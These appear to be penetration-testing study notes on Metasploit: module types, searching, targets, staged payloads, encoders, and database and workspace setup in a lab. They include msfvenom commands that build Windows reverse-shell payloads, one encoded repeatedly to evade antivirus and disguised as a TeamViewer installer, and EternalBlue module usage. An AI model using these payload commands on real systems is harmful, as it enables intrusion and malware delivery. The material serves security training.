# 👑 MSF Components

The `Type` tag is the first level of segregation between the Metasploit `modules`. Looking at this field, we can tell what the piece of code for this module will accomplish.

here are the possible types that could appear in this field:

<table data-header-hidden><thead><tr><th width="170"></th><th></th></tr></thead><tbody><tr><td><strong>Type</strong></td><td><strong>Description</strong></td></tr><tr><td><code>Auxiliary</code></td><td>Scanning, fuzzing, sniffing, and admin capabilities. Offer extra assistance and functionality.</td></tr><tr><td><code>Encoders</code></td><td>Ensure that payloads are intact to their destination.</td></tr><tr><td><code>Exploits</code></td><td>Defined as modules that exploit a vulnerability that will allow for the payload delivery.</td></tr><tr><td><code>NOPs</code></td><td>(No Operation code) Keep the payload sizes consistent across exploit attempts.</td></tr><tr><td><code>Payloads</code></td><td>Code runs remotely and calls back to the attacker machine to establish a connection (or shell).</td></tr><tr><td><code>Plugins</code></td><td>Additional scripts can be integrated within an assessment with <code>msfconsole</code> and coexist.</td></tr><tr><td><code>Post</code></td><td>Wide array of modules to gather information, pivot deeper, etc.</td></tr></tbody></table>

**MSF - Specific Search**

the CVE, we could specify the year (`cve:<year>`), the platform Windows (`platform:<os>`), the type of module we want to find (`type:<auxiliary/exploit/post>`), the reliability rank (`rank:<rank>`), and the search name (`<pattern>`)

```shell-session
msf6 > search type:exploit platform:windows cve:2021 rank:excellent microsoft
```

In addition, instead of specifying something every time, we can use `setg`, which specifies options selected by us as permanent until the program is restarted.

```shell-session
msf6 exploit(windows/smb/ms17_010_psexec) > setg RHOSTS 10.10.10.40
```

## Targets

The `show targets` command issued within an exploit module view will display all available vulnerable targets for that specific exploit, while issuing the same command in the root menu, outside of any selected exploit module, will let us know that we need to select an exploit module first.

```shell-session
msf6 > show targets
```

We can get a lot of informations about a module with the `info` command

<pre class="language-shell-session"><code class="lang-shell-session"><strong>&#x3C;SNIP>
</strong><strong>Description:
</strong>  This module exploits a vulnerability found in Microsoft Internet 
  Explorer (MSIE). When rendering an HTML page, the CMshtmlEd object 
  gets deleted in an unexpected manner, but the same memory is reused 
  again later in the CMshtmlEd::Exec() function, leading to a 
  use-after-free condition.
&#x3C;SNIP>
</code></pre>

we can use the `set target <index no.>` command to pick a target from the list.

```shell-session
msf6 exploit(windows/browser/ie_execcommand_uaf) > show targets

Exploit targets:

   Id  Name
   --  ----
   0   Automatic
   1   IE 7 on Windows XP SP3
   2   IE 8 on Windows XP SP3
   3   IE 7 on Windows Vista
<SNIP>
```

## Payloads

A `Payload` in Metasploit refers to a module that aids the exploit module in (typically) returning a shell to the attacker. The payloads are sent together with the exploit itself to bypass standard functioning procedures of the vulnerable service (`exploits job`) and then run on the target OS to typically return a reverse connection to the attacker and establish a foothold (`payload's job`).

`windows/shell_bind_tcp` is a single payload with no stage, whereas `windows/shell/bind_tcp` consists of a stager (`bind_tcp`) and a stage (`shell`).

A `Single` payload contains the exploit and the entire shellcode for the selected task. Inline payloads are by design more stable than their counterparts because they contain everything all-in-one. However, some exploits will not support the resulting size of these payloads as they can get quite large.

`Stager` payloads work with Stage payloads to perform a specific task. A Stager is waiting on the attacker machine, ready to establish a connection to the victim host once the stage completes its run on the remote host. `Stagers` are typically used to set up a network connection between the attacker and victim and are designed to be small and reliable.

A staged payload is, simply put, an `exploitation process` that is modularized and functionally separated to help segregate the different functions it accomplishes into different code blocks, each completing its objective individually but working on chaining the attack together.

***

To see all of the available payloads, use the `show payloads` command in `msfconsole`.

If we want ot look for a specific payload we can ->

```shell-session
msf6 exploit(windows/smb/ms17_010_eternalblue) > grep meterpreter show payloads
```

and even go more in depth with multiple greps ->

```shell-session
msf6 exploit(windows/smb/ms17_010_eternalblue) > grep meterpreter grep reverse_tcp show payloads
```

Once setting our options and running our payload we can pop a meterpreter shell and if that isn't enough for us we can launch a `shell` command and have proper shell

## Encoders

`Encoders` are used with making payloads compatible with different processor architectures while at the same time helping with antivirus evasion. `Encoders` come into play with the role of changing the payload to run on different operating systems and architectures like&#x20;

| `x64` | `x86` | `sparc` | `ppc` | `mips` |
| ----- | ----- | ------- | ----- | ------ |

Let's try to create a payload with and without encoding ->

**Without:**

```shell-session
ElFelixi0@htb[/htb]$ msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -b "\x00" -f perl
```

**With:**

```shell-session
ElFelixi0@htb[/htb]$ msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -b "\x00" -f perl -e x86/shikata_ga_nai
```

If we want to look at the functioning of the `shikata_ga_nai` encoder, we can look at an excellent post [here](https://hatching.io/blog/metasploit-payloads2/).

If we want an Encoder for an `existing payload`. Then, we can use the `show encoders` command within the `msfconsole` to see which encoders are available for our current `Exploit module + Payload` combination.

```shell-session
msf6 exploit(windows/smb/ms17_010_eternalblue) > set payload 15

payload => windows/x64/meterpreter/reverse_tcp


msf6 exploit(windows/smb/ms17_010_eternalblue) > show encoders
```

If we can to have a payload generation and Encoding schemes, it will be picked up by Virus Total

<figure><img src="../../../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>

One better option would be to try running it through multiple iterations of the same Encoding scheme:

```shell-session
ElFelixi0@htb[/htb]$ msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=8080 -e x86/shikata_ga_nai -f exe -i 10 -o /root/Desktop/TeamViewerInstall.exe
```

## Databases

`Msfconsole` has built-in support for the PostgreSQL database system. With it, we have direct, quick, and easy access to scan results with the added ability to import and export results in conjunction with third-party tools.

Here are the steps to set up our DB ->

1. ensure that the PostgreSQL server is up and running on our host machine.

```shell-session
ElFelixi0@htb[/htb]$ sudo service postgresql status
```

2. Start PostgreSQL

```shell-session
ElFelixi0@htb[/htb]$ sudo systemctl start postgresql
```

3. create and initialize the MSF database with `msfdb init`.

```shell-session
ElFelixi0@htb[/htb]$ sudo msfdb init
```

If we have an error it may be good to do a `apt update`

After the database has been initialized, we can start `msfconsole` and connect to the created database simultaneously.

```shell-session
ElFelixi0@htb[/htb]$ sudo msfdb run
```

however, we already have the database configured and are not able to change the password to the MSF username, proceed with these commands:

```shell-session
ElFelixi0@htb[/htb]$ msfdb reinit
ElFelixi0@htb[/htb]$ cp /usr/share/metasploit-framework/config/database.yml ~/.msf4/
ElFelixi0@htb[/htb]$ sudo service postgresql restart
ElFelixi0@htb[/htb]$ msfconsole -q
```

Then we can look at what is available to us ->

```shell-session
msf6 > help database
```

Once everything is up we can organize our `Workspaces`.

We can think of `Workspaces` the same way we would think of folders in a project. We can segregate the different scan results, hosts, and extracted information by IP, subnet, network, or domain.

```shell-session
msf6 > workspace
```

Type the `workspace [name]` command to switch the presently used workspace.

```shell-session
msf6 > workspace -a Target_1

[*] Added workspace: Target_1
[*] Workspace: Target_1


msf6 > workspace Target_1 

[*] Workspace: Target_1


msf6 > workspace

  default
* Target_1
```

#### Import results sto DB

If we want to import a `Nmap scan` of a host into our Database's Workspace to understand the target better. We can use the `db_import` command for this. `.xml` file type is preferred for `db_import`.

nmap scan into a Target.nmap file ->

```shell-session
ElFelixi0@htb[/htb]$ cat Target.nmap

Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-17 20:54 UTC
Nmap scan report for 10.10.10.40
<SNIP>
```

```shell-session
msf6 > db_import Target.xml

[*] Importing 'Nmap XML' data
[*] Import: Parsing with 'Nokogiri v1.10.9'
[*] Importing host 10.10.10.40
[*] Successfully imported ~/Target.xml


msf6 > hosts

Hosts
=====

address      mac  name  os_name  os_flavor  os_sp  purpose  info  comments
-------      ---  ----  -------  ---------  -----  -------  ----  --------
10.10.10.40             Unknown                    device         


msf6 > services

Services
========

host         port   proto  name          state  info
----         ----   -----  ----          -----  ----
10.10.10.40  135    tcp    msrpc         open   Microsoft Windows RPC
```

We can also use nmap in msfconsole ->

```shell-session
msf6 > db_nmap -sV -sS 10.10.10.8
```

If we want to back up our data if anything happens with the PostgreSQL service. To do so, use the `db_export` command.

```shell-session
msf6 > db_export -h
```

Another useful thing is to store credentials in msfconsole

The `creds` command allows you to visualize the credentials gathered during your interactions with the target host. We can also add credentials manually, match existing credentials with port specifications, add descriptions, etc.

```shell-session
msf6 > creds -h
<SNIP>
Examples: Adding
   # Add a user, password and realm
   creds add user:admin password:notpassword realm:workgroup
   # Add a user and password
   creds add user:guest password:'guest password'
   # Add a password
   creds add password:'password without username'
   # Add a user with an NTLMHash
   creds add user:admin ntlm:E2FC15074BF7751DD408E6B105741864:A1074A69B1BDE45403AB680504BBDD1A
<SNIP>
```

